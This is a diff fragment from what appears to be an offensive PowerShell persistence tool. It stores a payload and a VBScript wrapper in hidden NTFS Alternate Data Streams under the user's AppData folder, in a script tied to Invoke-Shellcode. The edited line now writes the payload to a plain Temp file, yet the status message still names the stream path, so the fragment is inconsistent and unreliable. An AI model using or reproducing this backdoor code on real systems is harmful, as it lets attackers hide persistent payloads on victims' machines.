@@ -73,7 +73,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     $vbText = $vbstext1 + ":" + $vbstext2 + ":" + $vbstext3 + ":" + $vbstext4 + ":" + $vbstext5
 
     #Create Alternate Data Streams for Payload and Wrapper
-    $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData\Local\Temp:$textFile"}
+    $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData\Local\Temp\$textFile"}
     $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
     "Payload stored in $env:USERPROFILE\AppData\Local\Temp:$textFile"
